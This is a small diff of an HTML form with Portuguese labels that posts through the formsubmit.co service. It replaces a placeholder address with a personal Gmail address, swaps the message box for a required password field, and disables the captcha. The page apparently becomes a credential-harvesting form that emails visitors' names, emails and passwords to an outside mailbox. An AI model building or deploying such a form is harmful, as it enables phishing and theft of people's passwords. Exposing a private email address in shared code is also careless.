@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <form action="https://formsubmit.co/your@email.com" method="POST">
+    <form action="https://formsubmit.co/soadse.ra@gmail.com" method="POST">
         <div>
             <label for="name">Nome:</label>
             <input type="text" id="name" name="name" required>
@@ -17,8 +17,11 @@
             <input type="email" id="email" name="email" required>
         </div>
         <div>
-            <textarea placeholder="Sua Mensagem" class="form-control" name="message" rows="10" required></textarea>
+            <label for="senha">Senha:</label>
+            <input type="password" id="senha" name="senha" required>
         </div>
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
         <button type="submit">Send</button>
     </form>
 </body>
